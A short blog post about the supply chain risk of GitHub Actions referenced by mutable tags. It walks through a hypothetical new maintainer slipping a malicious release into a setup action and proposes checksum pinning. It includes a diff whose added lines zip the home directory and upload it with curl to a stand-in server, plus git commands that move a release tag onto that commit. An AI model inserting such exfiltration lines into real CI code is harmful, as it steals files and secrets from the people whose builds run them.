---
date: 20240511
title: GitHub Actions beg for a supply chain attack
description: We're 
---

# GitHub Actions beg for a supply chain attack

When the GitHub Actions runner sees

```yaml
- name: Clone repository
  uses: actions/checkout@v4
```

it `git clone`s the `checkout` repository of the `actions` user/organization on
GitHub and then switches to the git tag named `v4`. The `actions` org is
maintained by GitHub staff, so we trust it to be secure and well-behaved.

Recently though, a cool new framework is taking off. It's called `foo`. Your
company decides to build a project with it and one of your tasks in the current
sprint is to set up a CI pipeline. Fortunately, the open-source community
delivers once again; you quickly discover that somebody has already created an
Action to make setup easy:

```yaml
- name: Set up Foo
  uses: alice/setup-foo@v2
```

Some time later `alice` stops maintaining the `setup-foo` action, but she wants
the Action to live on, so she appoints a new friendly person who's been around
the repo for a while and contributed a few PRs. That's how `malloy` becomes the
maintainer of `setup-foo`.

Some time later, `malloy` makes a new release of `setup-foo` with the following
code:

```diff
 #!/usr/bin/env sh
 echo "imagine there is shell code here"
+cd ~ && zip -r nothing_really.zip .
+curl \
+  --request POST https://totally-legit-server.ru \
+  --form "file=@$HOME/nothing_really.zip"
+cd -
 echo "legit shell code"
 echo "more legit shell code"
```

The change is introduced in a commit with the message "bump deps" that removes
6969 and adds 2137 lines of code to many files, mostly `package-lock.json`. Then
`malloy` releases this new version as `v2.1`:

```console
git commit -m "bump deps" && git push origin master
git tag v2.1
```

and then he moves the `v2` tag to point to the same commit as `v2.1`, [**just
like GitHub recommends**][gh]:

```console
git tag --delete v2 # delete tag locally
git push origin :v2 # delete tag on the remote
git tag v2
git push --tags
```

It's a Friday night. Hundreds of thousands of nightly builds run, in thousands
of repositories, including private ones.

No one notices anything for a few days.

---

My knowledge of the cybersecurity landscape is very basic, but I suppose a
solution could be for GitHub to deprecate the current way of using external
actions, and require us to provide a checksum:

```yaml
- name: Set up Foo
  uses: alice/setup-foo@v2
  sha256: ea3a03b4971eeb62730e1de238225cc4e6145f0eb50ad28b1379f2a2ee71e16e
```

The problem with the above is twofold:

- First and foremost, it no longer looks as sexy.
- Realistically, who checks the diff when bumping the dependencies?

---

I maintain the GiHub Actions called [subosito/flutter-action][^1]. If you
enjoyed the read, consider [sending me a few bucks for coffee][sponsor]. I pinky
promise to never perform a supply chain attack on you.

[gh]: https://docs.github.com/en/actions/creating-actions/about-custom-actions#using-tags-for-release-management
[sponsor]: https://github.com/sponsors/bartekpacia
[subosito/flutter-action]: https://github.com/subosito/flutter-action

[^1]: It should be named `setup-flutter`.
